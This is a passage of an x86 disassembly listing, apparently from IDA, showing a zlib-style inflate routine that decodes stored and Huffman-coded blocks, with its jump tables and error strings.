; ---------------------------------------------------------------------------

loc_4017CD:				; CODE XREF: sub_401676+C2j
		sub	[ebp+arg_4], 3
		mov	ecx, [ebp+arg_4]
		mov	eax, [ebp+arg_0]
		and	ecx, 7
		shr	eax, 3
		shr	eax, cl
		sub	[ebp+arg_4], ecx
		mov	dword ptr [esi], 1
		mov	[ebp+arg_0], eax
		jmp	loc_401CD4
; ---------------------------------------------------------------------------

loc_4017F0:				; CODE XREF: sub_401676:loc_4016F7j
					; DATA XREF: .text:off_401DFAo
		mov	ecx, [ebp+arg_4] ; jumptable 004016F7 case 1
		jmp	short loc_401815
; ---------------------------------------------------------------------------

loc_4017F5:				; CODE XREF: sub_401676+1A2j
		cmp	[ebp+var_4], 0
		jz	loc_401CE4
		movzx	eax, byte ptr [ebx]
		and	[ebp+arg_8], 0
		dec	[ebp+var_4]
		shl	eax, cl
		or	[ebp+arg_0], eax
		inc	ebx
		add	ecx, 8
		mov	[ebp+arg_4], ecx

loc_401815:				; CODE XREF: sub_401676+17Dj
		cmp	ecx, 20h
		jb	short loc_4017F5
		mov	ecx, [ebp+arg_0]
		mov	eax, [ebp+arg_0]
		not	ecx
		and	eax, 0FFFFh
		shr	ecx, 10h
		cmp	ecx, eax
		jnz	loc_401D03
		and	[ebp+arg_4], 0
		and	[ebp+arg_0], 0
		mov	[esi+4], eax
		neg	eax
		sbb	eax, eax
		and	eax, 2

loc_401844:				; CODE XREF: sub_401676+102j
					; sub_401676+2C0j
		mov	[esi], eax
		jmp	loc_401CD4
; ---------------------------------------------------------------------------

loc_40184B:				; CODE XREF: sub_401676:loc_4016F7j
					; DATA XREF: .text:off_401DFAo
		cmp	[ebp+var_4], 0	; jumptable 004016F7 case 2
		jz	loc_401CE4
		test	ecx, ecx
		jnz	loc_4018E7
		mov	ecx, [esi+28h]
		cmp	edx, ecx
		jnz	short loc_401886
		mov	eax, [esi+2Ch]
		mov	edx, [esi+24h]
		cmp	edx, eax
		jz	short loc_401886
		mov	[ebp+Dst], edx
		jnb	short loc_40187B
		sub	eax, edx
		dec	eax
		mov	[ebp+var_C], eax
		jmp	short loc_401880
; ---------------------------------------------------------------------------

loc_40187B:				; CODE XREF: sub_401676+1FBj
		sub	ecx, edx
		mov	[ebp+var_C], ecx

loc_401880:				; CODE XREF: sub_401676+203j
		cmp	[ebp+var_C], 0
		jnz	short loc_4018E7

loc_401886:				; CODE XREF: sub_401676+1ECj
					; sub_401676+1F6j
		push	[ebp+arg_8]
		mov	eax, [ebp+Dst]
		push	edi
		push	esi
		mov	[esi+30h], eax
		call	sub_40315C
		mov	ecx, [esi+2Ch]
		mov	[ebp+arg_8], eax
		mov	eax, [esi+30h]
		add	esp, 0Ch
		mov	[ebp+Dst], eax
		cmp	eax, ecx
		jnb	short loc_4018B4
		mov	eax, ecx
		sub	eax, [ebp+Dst]
		dec	eax
		mov	[ebp+var_C], eax
		jmp	short loc_4018BC
; ---------------------------------------------------------------------------

loc_4018B4:				; CODE XREF: sub_401676+231j
		mov	edx, [esi+28h]
		sub	edx, eax
		mov	[ebp+var_C], edx

loc_4018BC:				; CODE XREF: sub_401676+23Cj
		mov	edx, [esi+28h]
		cmp	[ebp+Dst], edx
		jnz	short loc_4018DD
		mov	eax, [esi+24h]
		cmp	eax, ecx
		jz	short loc_4018DD
		mov	[ebp+Dst], eax
		jnb	short loc_4018D8
		sub	ecx, eax
		dec	ecx
		mov	[ebp+var_C], ecx
		jmp	short loc_4018DD
; ---------------------------------------------------------------------------

loc_4018D8:				; CODE XREF: sub_401676+258j
		sub	edx, eax
		mov	[ebp+var_C], edx

loc_4018DD:				; CODE XREF: sub_401676+24Cj
					; sub_401676+253j ...
		cmp	[ebp+var_C], 0
		jz	loc_401D17

loc_4018E7:				; CODE XREF: sub_401676+1E1j
					; sub_401676+20Ej
		mov	eax, [esi+4]
		mov	ecx, [ebp+var_4]
		and	[ebp+arg_8], 0
		mov	[ebp+Size], eax
		cmp	eax, ecx
		jbe	short loc_4018FB
		mov	[ebp+Size], ecx

loc_4018FB:				; CODE XREF: sub_401676+280j
		mov	eax, [ebp+var_C]
		cmp	[ebp+Size], eax
		jbe	short loc_401906
		mov	[ebp+Size], eax

loc_401906:				; CODE XREF: sub_401676+28Bj
		push	[ebp+Size]	; Size
		push	ebx		; Src
		push	[ebp+Dst]	; Dst
		call	memcpy
		mov	eax, [ebp+Size]
		sub	[ebp+var_4], eax
		add	[ebp+Dst], eax
		sub	[ebp+var_C], eax
		add	esp, 0Ch
		add	ebx, eax
		sub	[esi+4], eax
		jnz	loc_401CD4
		mov	eax, [esi+18h]
		neg	eax
		sbb	eax, eax
		and	eax, 7
		jmp	loc_401844
; ---------------------------------------------------------------------------

loc_40193B:				; CODE XREF: sub_401676:loc_4016F7j
					; DATA XREF: .text:off_401DFAo
		mov	ecx, [ebp+arg_4] ; jumptable 004016F7 case 3
		jmp	short loc_401960
; ---------------------------------------------------------------------------

loc_401940:				; CODE XREF: sub_401676+2EDj
		cmp	[ebp+var_4], 0
		jz	loc_401CE4
		movzx	eax, byte ptr [ebx]
		and	[ebp+arg_8], 0
		dec	[ebp+var_4]
		shl	eax, cl
		or	[ebp+arg_0], eax
		inc	ebx
		add	ecx, 8
		mov	[ebp+arg_4], ecx

loc_401960:				; CODE XREF: sub_401676+2C8j
		cmp	ecx, 0Eh
		jb	short loc_401940
		mov	eax, [ebp+arg_0]
		and	eax, 3FFFh
		mov	ecx, eax
		and	ecx, 1Fh
		mov	[esi+4], eax
		cmp	ecx, 1Dh
		ja	loc_401D1F
		shr	eax, 5
		and	eax, 1Fh
		cmp	eax, 1Dh
		ja	loc_401D1F
		lea	eax, [eax+ecx+102h]
		cmp	eax, 13h
		jnb	short loc_40199C
		push	13h
		pop	eax

loc_40199C:				; CODE XREF: sub_401676+321j
		push	4
		push	eax
		push	dword ptr [edi+28h]
		call	dword ptr [edi+20h]
		add	esp, 0Ch
		mov	[esi+0Ch], eax
		test	eax, eax
		jz	loc_401CFC
		shr	[ebp+arg_0], 0Eh
		sub	[ebp+arg_4], 0Eh
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], 4
		jmp	short loc_401A12 ; jumptable 004016F7 case 4
; ---------------------------------------------------------------------------

loc_4019C7:				; CODE XREF: sub_401676+3A8j
		mov	ecx, [ebp+arg_4]
		jmp	short loc_4019EC
; ---------------------------------------------------------------------------

loc_4019CC:				; CODE XREF: sub_401676+379j
		cmp	[ebp+var_4], 0
		jz	loc_401CE4
		movzx	eax, byte ptr [ebx]
		and	[ebp+arg_8], 0
		dec	[ebp+var_4]
		shl	eax, cl
		or	[ebp+arg_0], eax
		inc	ebx
		add	ecx, 8
		mov	[ebp+arg_4], ecx

loc_4019EC:				; CODE XREF: sub_401676+354j
		cmp	ecx, 3
		jb	short loc_4019CC
		mov	ecx, [esi+8]
		mov	eax, [ebp+arg_0]
		mov	ecx, dword_4050C8[ecx*4]
		mov	edx, [esi+0Ch]
		shr	[ebp+arg_0], 3
		and	eax, 7
		mov	[edx+ecx*4], eax
		inc	dword ptr [esi+8]
		sub	[ebp+arg_4], 3

loc_401A12:				; CODE XREF: sub_401676:loc_4016F7j
					; sub_401676+34Fj
					; DATA XREF: ...
		mov	eax, [esi+4]	; jumptable 004016F7 case 4
		shr	eax, 0Ah
		add	eax, 4
		cmp	[esi+8], eax
		jb	short loc_4019C7
		jmp	short loc_401A36
; ---------------------------------------------------------------------------

loc_401A22:				; CODE XREF: sub_401676+3C4j
		mov	eax, [esi+8]
		mov	eax, dword_4050C8[eax*4]
		mov	ecx, [esi+0Ch]
		and	dword ptr [ecx+eax*4], 0
		inc	dword ptr [esi+8]

loc_401A36:				; CODE XREF: sub_401676+3AAj
		cmp	dword ptr [esi+8], 13h
		jb	short loc_401A22
		push	edi
		lea	ecx, [esi+14h]
		lea	eax, [esi+10h]
		push	ecx
		push	eax
		push	dword ptr [esi+0Ch]
		mov	dword ptr [eax], 7
		call	sub_402F2E
		add	esp, 10h
		test	eax, eax
		jnz	loc_401D2E
		and	[esi+8], eax
		mov	dword ptr [esi], 5
		jmp	loc_401B8A	; jumptable 004016F7 case 5
; ---------------------------------------------------------------------------

loc_401A6C:				; CODE XREF: sub_401676+52Cj
		mov	eax, [esi+10h]
		jmp	short loc_401A92
; ---------------------------------------------------------------------------

loc_401A71:				; CODE XREF: sub_401676+41Fj
		cmp	[ebp+var_4], 0
		jz	loc_401CE4
		movzx	edx, byte ptr [ebx]
		mov	ecx, [ebp+arg_4]
		and	[ebp+arg_8], 0
		dec	[ebp+var_4]
		shl	edx, cl
		or	[ebp+arg_0], edx
		inc	ebx
		add	[ebp+arg_4], 8

loc_401A92:				; CODE XREF: sub_401676+3F9j
		cmp	[ebp+arg_4], eax
		jb	short loc_401A71
		mov	eax, dword_405308[eax*4]
		and	eax, [ebp+arg_0]
		mov	ecx, [esi+14h]
		lea	eax, [ecx+eax*8]
		movzx	ecx, byte ptr [eax+1]
		mov	edx, [eax+4]
		mov	[ebp+Size], ecx
		mov	[ebp+var_2C], edx
		cmp	edx, 10h
		jnb	short loc_401AD2
		shr	[ebp+arg_0], cl
		mov	eax, ecx
		sub	[ebp+arg_4], eax
		mov	eax, [esi+8]
		mov	ecx, [esi+0Ch]
		mov	[ecx+eax*4], edx
		inc	dword ptr [esi+8]
		jmp	loc_401B8A	; jumptable 004016F7 case 5
; ---------------------------------------------------------------------------

loc_401AD2:				; CODE XREF: sub_401676+441j
		cmp	edx, 12h
		jnz	short loc_401ADC
		push	7
		pop	eax
		jmp	short loc_401ADF
; ---------------------------------------------------------------------------

loc_401ADC:				; CODE XREF: sub_401676+45Fj
		lea	eax, [edx-0Eh]

loc_401ADF:				; CODE XREF: sub_401676+464j
		xor	ecx, ecx
		cmp	edx, 12h
		setz	cl
		lea	ecx, ds:3[ecx*8]
		mov	[ebp+var_C], ecx
		jmp	short loc_401B14
; ---------------------------------------------------------------------------

loc_401AF3:				; CODE XREF: sub_401676+4A7j
		cmp	[ebp+var_4], 0
		jz	loc_401CE4
		movzx	edx, byte ptr [ebx]
		mov	ecx, [ebp+arg_4]
		and	[ebp+arg_8], 0
		dec	[ebp+var_4]
		shl	edx, cl
		or	[ebp+arg_0], edx
		inc	ebx
		add	[ebp+arg_4], 8

loc_401B14:				; CODE XREF: sub_401676+47Bj
		mov	ecx, [ebp+Size]
		lea	edx, [eax+ecx]
		cmp	[ebp+arg_4], edx
		jb	short loc_401AF3
		shr	[ebp+arg_0], cl
		mov	ecx, dword_405308[eax*4]
		and	ecx, [ebp+arg_0]
		add	[ebp+var_C], ecx
		mov	ecx, eax
		shr	[ebp+arg_0], cl
		mov	ecx, [ebp+Size]
		add	eax, ecx
		sub	[ebp+arg_4], eax
		mov	eax, [esi+4]
		mov	ecx, [esi+8]
		mov	edx, eax
		shr	edx, 5
		and	edx, 1Fh
		and	eax, 1Fh
		lea	eax, [edx+eax+102h]
		mov	edx, [ebp+var_C]
		add	edx, ecx
		cmp	edx, eax
		ja	loc_401D60
		cmp	[ebp+var_2C], 10h
		jnz	short loc_401B79
		cmp	ecx, 1
		jb	loc_401D60
		mov	eax, [esi+0Ch]
		mov	eax, [eax+ecx*4-4]
		jmp	short loc_401B7B
; ---------------------------------------------------------------------------

loc_401B79:				; CODE XREF: sub_401676+4EFj
		xor	eax, eax

loc_401B7B:				; CODE XREF: sub_401676+501j
					; sub_401676+50Fj
		mov	edx, [esi+0Ch]
		mov	[edx+ecx*4], eax
		inc	ecx
		dec	[ebp+var_C]
		jnz	short loc_401B7B
		mov	[esi+8], ecx

loc_401B8A:				; CODE XREF: sub_401676:loc_4016F7j
					; sub_401676+3F1j ...
		mov	eax, [esi+4]	; jumptable 004016F7 case 5
		mov	ecx, eax
		shr	ecx, 5
		and	ecx, 1Fh
		and	eax, 1Fh
		lea	eax, [ecx+eax+102h]
		cmp	[esi+8], eax
		jb	loc_401A6C
		push	edi
		push	dword ptr [esi+14h]
		call	sub_402B76
		mov	eax, [esi+4]
		and	dword ptr [esi+14h], 0
		push	edi
		lea	ecx, [ebp+var_14]
		push	ecx
		lea	ecx, [ebp+var_18]
		push	ecx
		lea	ecx, [ebp+Size]
		push	ecx
		lea	ecx, [ebp+var_C]
		push	ecx
		push	dword ptr [esi+0Ch]
		mov	ecx, eax
		shr	ecx, 5
		and	ecx, 1Fh
		inc	ecx
		and	eax, 1Fh
		push	ecx
		add	eax, 101h
		push	eax
		mov	[ebp+var_C], 9
		mov	[ebp+Size], 6
		call	sub_402F7C
		add	esp, 28h
		test	eax, eax
		jnz	loc_401D6F
		push	edi
		push	[ebp+var_14]
		push	[ebp+var_18]
		push	[ebp+Size]
		push	[ebp+var_C]
		call	sub_401E4F
		add	esp, 14h
		mov	[ebp+var_2C], eax
		test	eax, eax
		jz	loc_401D74
		push	dword ptr [esi+0Ch]
		push	dword ptr [edi+28h]
		call	dword ptr [edi+24h]
		mov	eax, [ebp+var_2C]
		mov	[esi+0Ch], eax
		mov	eax, [ebp+var_18]
		mov	[esi+4], eax
		mov	eax, [ebp+var_14]
		pop	ecx
		pop	ecx
		mov	[esi+8], eax
		mov	dword ptr [esi], 6

loc_401C40:				; CODE XREF: sub_401676:loc_4016F7j
					; DATA XREF: .text:off_401DFAo
		mov	eax, [ebp+arg_0] ; jumptable 004016F7 case 6
		push	[ebp+arg_8]
		mov	[esi+20h], eax
		mov	eax, [ebp+arg_4]
		mov	[esi+1Ch], eax
		mov	eax, [ebp+var_4]
		mov	[edi+4], eax
		mov	eax, ebx
		sub	eax, [edi]
		push	edi
		add	[edi+8], eax
		mov	eax, [ebp+Dst]
		mov	[edi], ebx
		push	esi
		mov	[esi+30h], eax
		call	sub_401E83
		add	esp, 0Ch
		cmp	eax, 1
		jnz	loc_401D5A
		and	[ebp+arg_8], 0
		push	edi
		push	dword ptr [esi+0Ch]
		call	sub_4023A7
		push	edi
		push	dword ptr [esi+8]
		call	sub_402B76
		push	edi
		push	dword ptr [esi+4]
		call	sub_402B76
		mov	eax, [edi+4]
		mov	ecx, [esi+30h]
		mov	ebx, [edi]
		mov	[ebp+var_4], eax
		mov	eax, [esi+20h]
		mov	[ebp+arg_0], eax
		mov	eax, [esi+1Ch]
		mov	[ebp+arg_4], eax
		mov	eax, [esi+2Ch]
		add	esp, 18h
		mov	[ebp+Dst], ecx
		cmp	ecx, eax
		jnb	short loc_401CBF
		sub	eax, ecx
		dec	eax
		jmp	short loc_401CC4
; ---------------------------------------------------------------------------

loc_401CBF:				; CODE XREF: sub_401676+642j
		mov	eax, [esi+28h]
		sub	eax, ecx

loc_401CC4:				; CODE XREF: sub_401676+647j
		cmp	dword ptr [esi+18h], 0
		mov	[ebp+var_C], eax
		jnz	loc_401DB8
		and	dword ptr [esi], 0

loc_401CD4:				; CODE XREF: sub_401676+CFj
					; sub_401676+152j ...
		mov	eax, [esi]
		cmp	eax, 9
		jbe	loc_4016F1
		jmp	loc_4016BF	; jumptable 004016F7 default case
; ---------------------------------------------------------------------------

loc_401CE4:				; CODE XREF: sub_401676+8Cj
					; sub_401676+183j ...
		mov	eax, [ebp+arg_0]
		push	[ebp+arg_8]
		mov	[esi+20h], eax
		mov	eax, [ebp+arg_4]
		mov	[esi+1Ch], eax
		and	dword ptr [edi+4], 0
		jmp	loc_4016D3
; ---------------------------------------------------------------------------

loc_401CFC:				; CODE XREF: sub_401676+136j
					; sub_401676+337j
		push	0FFFFFFFCh
		jmp	loc_4016C1
; ---------------------------------------------------------------------------

loc_401D03:				; CODE XREF: sub_401676+1B6j
		mov	dword ptr [esi], 9
		mov	dword ptr [edi+18h], offset aInvalidStoredB ; "invalid stored block lengths"

loc_401D10:				; CODE XREF: sub_401676:loc_4016F7j
					; sub_401676+6B6j ...
		push	0FFFFFFFDh	; jumptable 004016F7 case 9
		jmp	loc_4016C1
; ---------------------------------------------------------------------------

loc_401D17:				; CODE XREF: sub_401676+26Bj
		push	[ebp+arg_8]
		jmp	loc_4016C1
; ---------------------------------------------------------------------------

loc_401D1F:				; CODE XREF: sub_401676+302j
					; sub_401676+311j
		mov	dword ptr [esi], 9
		mov	dword ptr [edi+18h], offset aTooManyLengthO ; "too many	length or distance symbols"
		jmp	short loc_401D10 ; jumptable 004016F7 case 9
; ---------------------------------------------------------------------------

loc_401D2E:				; CODE XREF: sub_401676+3E2j
		cmp	eax, 0FFFFFFFDh

loc_401D31:				; CODE XREF: sub_401676+6FCj
		jnz	short loc_401D39
		mov	dword ptr [esi], 9

loc_401D39:				; CODE XREF: sub_401676:loc_401D31j
					; sub_401676+770j
		mov	ecx, [ebp+arg_0]
		mov	[esi+20h], ecx
		mov	ecx, [ebp+arg_4]
		mov	[esi+1Ch], ecx
		mov	ecx, [ebp+var_4]
		mov	[edi+4], ecx
		mov	ecx, ebx
		sub	ecx, [edi]
		mov	[edi], ebx
		add	[edi+8], ecx
		mov	ecx, [ebp+Dst]
		mov	[esi+30h], ecx

loc_401D5A:				; CODE XREF: sub_401676+5FBj
		push	eax
		jmp	loc_4016E2
; ---------------------------------------------------------------------------

loc_401D60:				; CODE XREF: sub_401676+4E5j
					; sub_401676+4F4j
		mov	dword ptr [esi], 9
		mov	dword ptr [edi+18h], offset aInvalidBitLeng ; "invalid bit length repeat"
		jmp	short loc_401D10 ; jumptable 004016F7 case 9
; ---------------------------------------------------------------------------

loc_401D6F:				; CODE XREF: sub_401676+581j
		cmp	eax, 0FFFFFFFDh
		jmp	short loc_401D31
; ---------------------------------------------------------------------------

loc_401D74:				; CODE XREF: sub_401676+5A1j
		push	edi
		push	[ebp+var_14]
		call	sub_402B76
		push	edi
		push	[ebp+var_18]
		call	sub_402B76
		mov	eax, [ebp+arg_0]
		mov	[esi+20h], eax
		mov	eax, [ebp+arg_4]
		mov	[esi+1Ch], eax
		mov	eax, [ebp+var_4]
		mov	[edi+4], eax
		mov	eax, ebx
		sub	eax, [edi]
		push	0FFFFFFFCh
		add	[edi+8], eax
		mov	eax, [ebp+Dst]
		push	edi
		mov	[edi], ebx
		push	esi
		mov	[esi+30h], eax
		call	sub_40315C
		add	esp, 1Ch
		jmp	loc_4016EC
; ---------------------------------------------------------------------------

loc_401DB8:				; CODE XREF: sub_401676+655j
		push	7
		pop	eax
		cmp	[ebp+arg_4], eax
		jbe	short loc_401DC8
		sub	[ebp+arg_4], 8
		inc	[ebp+var_4]
		dec	ebx

loc_401DC8:				; CODE XREF: sub_401676+748j
		mov	[esi], eax

loc_401DCA:				; CODE XREF: sub_401676:loc_4016F7j
					; DATA XREF: .text:off_401DFAo
		push	[ebp+arg_8]	; jumptable 004016F7 case 7
		mov	eax, [ebp+Dst]
		push	edi
		push	esi
		mov	[esi+30h], eax
		call	sub_40315C
		mov	ecx, [esi+30h]
		add	esp, 0Ch
		mov	[ebp+Dst], ecx
		cmp	[esi+2Ch], ecx
		jnz	loc_401D39
		mov	dword ptr [esi], 8

loc_401DF2:				; CODE XREF: sub_401676:loc_4016F7j
					; DATA XREF: .text:off_401DFAo
		push	1		; jumptable 004016F7 case 8
		jmp	loc_4016C1
sub_401676	endp

; ---------------------------------------------------------------------------
		align 2
off_401DFA	dd offset loc_40171F	; DATA XREF: sub_401676:loc_4016F7r
		dd offset loc_4017F0	; jump table for switch	statement
		dd offset loc_40184B
		dd offset loc_40193B
		dd offset loc_401A12
		dd offset loc_401B8A
		dd offset loc_401C40
		dd offset loc_401DCA
		dd offset loc_401DF2
		dd offset loc_401D10

; =============== S U B	R O U T	I N E =======================================


sub_401E22	proc near		; CODE XREF: sub_4026D2+25p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_4]
		push	edi
		push	[esp+8+arg_8]
		mov	edi, [esp+0Ch+arg_0]
		push	esi
		push	edi
		call	sub_401596
		push	dword ptr [edi+24h]
		push	dword ptr [esi+28h]
		call	dword ptr [esi+24h]
		push	edi
		push	dword ptr [esi+28h]
		call	dword ptr [esi+24h]
		add	esp, 1Ch
		pop	edi
		xor	eax, eax
		pop	esi
		retn
sub_401E22	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401E4F	proc near		; CODE XREF: sub_401676+129p
					; sub_401676+594p

arg_0		= byte ptr  8
arg_4		= byte ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_10]
		push	1Ch
		push	1
		push	dword ptr [eax+28h]
		call	dword ptr [eax+20h]
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_401E81
		mov	cl, [ebp+arg_0]
		and	dword ptr [eax], 0
		mov	[eax+10h], cl
		mov	cl, [ebp+arg_4]
		mov	[eax+11h], cl
		mov	ecx, [ebp+arg_8]
		mov	[eax+14h], ecx
		mov	ecx, [ebp+arg_C]
		mov	[eax+18h], ecx

loc_401E81:				; CODE XREF: sub_401E4F+15j
		pop	ebp
		retn
sub_401E4F	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401E83	proc near		; CODE XREF: sub_401676+5F0p

var_14		= dword	ptr -14h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 18h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		mov	eax, [esi]
		mov	[ebp+var_4], eax
		mov	eax, [esi+4]
		push	edi
		mov	edi, [ebp+arg_0]
		mov	edx, [edi+30h]
		mov	ebx, [edi+0Ch]
		mov	[ebp+var_8], eax
		mov	eax, [edi+20h]
		mov	[ebp+arg_4], eax
		mov	eax, [edi+1Ch]
		mov	[ebp+arg_0], eax
		mov	eax, [edi+2Ch]
		cmp	edx, eax
		jnb	short loc_401EBE
		sub	eax, edx
		dec	eax
		jmp	loc_4022CC
; ---------------------------------------------------------------------------

loc_401EBE:				; CODE XREF: sub_401E83+31j
		mov	eax, [edi+28h]
		sub	eax, edx
		jmp	loc_4022CC
; ---------------------------------------------------------------------------

loc_401EC8:				; CODE XREF: sub_401E83+451j
		jmp	ds:off_40237F[ecx*4]

loc_401ECF:				; DATA XREF: .text:off_40237Fo
		cmp	eax, 102h
		jb	loc_401F6D
		cmp	[ebp+var_8], 0Ah
		jb	loc_401F6D
		mov	eax, [ebp+arg_4]
		mov	[edi+20h], eax
		mov	eax, [ebp+arg_0]
		mov	[edi+1Ch], eax
		mov	eax, [ebp+var_8]
		mov	[esi+4], eax
		mov	eax, [ebp+var_4]
		mov	ecx, eax
		sub	ecx, [esi]
		push	esi
		add	[esi+8], ecx
		mov	[esi], eax
		mov	[edi+30h], edx
		movzx	eax, byte ptr [ebx+11h]
		push	edi
		push	dword ptr [ebx+18h]
		push	dword ptr [ebx+14h]
		push	eax
		movzx	eax, byte ptr [ebx+10h]
		push	eax
		call	sub_4023B8
		mov	edx, [edi+30h]
		mov	[ebp+arg_8], eax
		mov	eax, [esi]
		mov	[ebp+var_4], eax
		mov	eax, [esi+4]
		mov	[ebp+var_8], eax
		mov	eax, [edi+20h]
		mov	[ebp+arg_4], eax
		mov	eax, [edi+1Ch]
		mov	[ebp+arg_0], eax
		mov	eax, [edi+2Ch]
		add	esp, 18h
		cmp	edx, eax
		jnb	short loc_401F48
		sub	eax, edx
		dec	eax
		jmp	short loc_401F4D
; ---------------------------------------------------------------------------

loc_401F48:				; CODE XREF: sub_401E83+BEj
		mov	eax, [edi+28h]
		sub	eax, edx

loc_401F4D:				; CODE XREF: sub_401E83+C3j
		cmp	[ebp+arg_8], 0
		mov	[ebp+var_C], eax
		jz	short loc_401F6D
		xor	eax, eax
		cmp	[ebp+arg_8], 1
		setnz	al
		lea	eax, [eax+eax+7]
		mov	[ebx], eax

loc_401F65:				; CODE XREF: sub_401E83+164j
					; sub_401E83+17Fj ...
		mov	eax, [ebp+var_C]
		jmp	loc_4022CF
; ---------------------------------------------------------------------------

loc_401F6D:				; CODE XREF: sub_401E83+51j
					; sub_401E83+5Bj ...
		movzx	eax, byte ptr [ebx+10h]
		mov	[ebx+0Ch], eax
		mov	eax, [ebx+14h]
		mov	[ebx+8], eax
		mov	dword ptr [ebx], 1
		jmp	short loc_401FA8
; ---------------------------------------------------------------------------

loc_401F82:				; CODE XREF: sub_401E83+12Bj
		cmp	[ebp+var_8], 0
		jz	loc_40230C
		mov	eax, [ebp+var_4]
		movzx	eax, byte ptr [eax]
		mov	ecx, [ebp+arg_0]
		and	[ebp+arg_8], 0
		dec	[ebp+var_8]
		shl	eax, cl
		or	[ebp+arg_4], eax
		inc	[ebp+var_4]
		add	[ebp+arg_0], 8

loc_401FA8:				; CODE XREF: sub_401E83:loc_401EC8j
					; sub_401E83+FDj
					; DATA XREF: ...
		mov	eax, [ebx+0Ch]
		cmp	[ebp+arg_0], eax
		jb	short loc_401F82
		mov	eax, dword_405308[eax*4]
		and	eax, [ebp+arg_4]
		mov	ecx, [ebx+8]
		lea	eax, [ecx+eax*8]
		movzx	ecx, byte ptr [eax+1]
		shr	[ebp+arg_4], cl
		mov	[ebp+var_14], eax
		movzx	eax, byte ptr [eax+1]
		sub	[ebp+arg_0], eax
		mov	ecx, [ebp+var_14]
		movzx	eax, byte ptr [ecx]
		test	eax, eax
		jnz	short loc_401FEC
		mov	eax, [ecx+4]
		mov	[ebx+8], eax
		mov	dword ptr [ebx], 6
		jmp	loc_401F65
; ---------------------------------------------------------------------------

loc_401FEC:				; CODE XREF: sub_401E83+156j
		test	al, 10h
		jz	short loc_402007
		and	eax, 0Fh
		mov	[ebx+8], eax
		mov	eax, [ecx+4]
		mov	[ebx+4], eax
		mov	dword ptr [ebx], 2
		jmp	loc_401F65
; ---------------------------------------------------------------------------

loc_402007:				; CODE XREF: sub_401E83+16Bj
		test	al, 40h
		jnz	short loc_402019

loc_40200B:				; CODE XREF: sub_401E83+276j
		mov	[ebx+0Ch], eax
		mov	eax, [ecx+4]
		mov	[ebx+8], eax
		jmp	loc_401F65
; ---------------------------------------------------------------------------

loc_402019:				; CODE XREF: sub_401E83+186j
		test	al, 20h
		jz	loc_402321
		mov	dword ptr [ebx], 7
		jmp	loc_401F65
; ---------------------------------------------------------------------------

loc_40202C:				; CODE XREF: sub_401E83+1D5j
		cmp	[ebp+var_8], 0
		jz	loc_40230C
		mov	eax, [ebp+var_4]
		movzx	eax, byte ptr [eax]
		mov	ecx, [ebp+arg_0]
		and	[ebp+arg_8], 0
		dec	[ebp+var_8]
		shl	eax, cl
		or	[ebp+arg_4], eax
		inc	[ebp+var_4]
		add	[ebp+arg_0], 8

loc_402052:				; CODE XREF: sub_401E83:loc_401EC8j
					; DATA XREF: .text:00402387o
		mov	eax, [ebx+8]
		cmp	[ebp+arg_0], eax
		jb	short loc_40202C
		mov	eax, dword_405308[eax*4]
		and	eax, [ebp+arg_4]
		mov	ecx, [ebx+8]
		add	[ebx+4], eax
		shr	[ebp+arg_4], cl
		mov	eax, ecx
		sub	[ebp+arg_0], eax
		movzx	eax, byte ptr [ebx+11h]
		mov	[ebx+0Ch], eax
		mov	eax, [ebx+18h]
		mov	[ebx+8], eax
		mov	dword ptr [ebx], 3
		jmp	short loc_4020AD
; ---------------------------------------------------------------------------

loc_402087:				; CODE XREF: sub_401E83+230j
		cmp	[ebp+var_8], 0
		jz	loc_40230C
		mov	eax, [ebp+var_4]
		movzx	eax, byte ptr [eax]
		mov	ecx, [ebp+arg_0]
		and	[ebp+arg_8], 0
		dec	[ebp+var_8]
		shl	eax, cl
		or	[ebp+arg_4], eax
		inc	[ebp+var_4]
		add	[ebp+arg_0], 8

loc_4020AD:				; CODE XREF: sub_401E83:loc_401EC8j
					; sub_401E83+202j
					; DATA XREF: ...
		mov	eax, [ebx+0Ch]
		cmp	[ebp+arg_0], eax
		jb	short loc_402087
		mov	eax, dword_405308[eax*4]
		and	eax, [ebp+arg_4]
		mov	ecx, [ebx+8]
		lea	eax, [ecx+eax*8]
		movzx	ecx, byte ptr [eax+1]
		shr	[ebp+arg_4], cl
		mov	[ebp+var_14], eax
		movzx	eax, byte ptr [eax+1]
		sub	[ebp+arg_0], eax
		mov	ecx, [ebp+var_14]
		movzx	eax, byte ptr [ecx]
		test	al, 10h
		jz	short loc_4020F7
		and	eax, 0Fh
		mov	[ebx+8], eax
		mov	eax, [ecx+4]
		mov	[ebx+0Ch], eax
		mov	dword ptr [ebx], 4
		jmp	loc_401F65
; ---------------------------------------------------------------------------

loc_4020F7:				; CODE XREF: sub_401E83+25Bj
		test	al, 40h
		jz	loc_40200B
		mov	dword ptr [ebx], 9
		mov	dword ptr [esi+18h], offset aInvalidDistanc ; "invalid distance	code"
		jmp	loc_40232E
; ---------------------------------------------------------------------------

loc_402111:				; CODE XREF: sub_401E83+2BAj
		cmp	[ebp+var_8], 0
		jz	loc_40230C
		mov	eax, [ebp+var_4]
		movzx	eax, byte ptr [eax]
		mov	ecx, [ebp+arg_0]
		and	[ebp+arg_8], 0
		dec	[ebp+var_8]
		shl	eax, cl
		or	[ebp+arg_4], eax
		inc	[ebp+var_4]
		add	[ebp+arg_0], 8

loc_402137:				; CODE XREF: sub_401E83:loc_401EC8j
					; DATA XREF: .text:0040238Fo
		mov	eax, [ebx+8]
		cmp	[ebp+arg_0], eax
		jb	short loc_402111
		mov	eax, dword_405308[eax*4]
		and	eax, [ebp+arg_4]
		mov	ecx, [ebx+8]
		add	[ebx+0Ch], eax
		shr	[ebp+arg_4], cl
		mov	eax, ecx
		sub	[ebp+arg_0], eax
		mov	dword ptr [ebx], 5

loc_40215D:				; CODE XREF: sub_401E83:loc_401EC8j
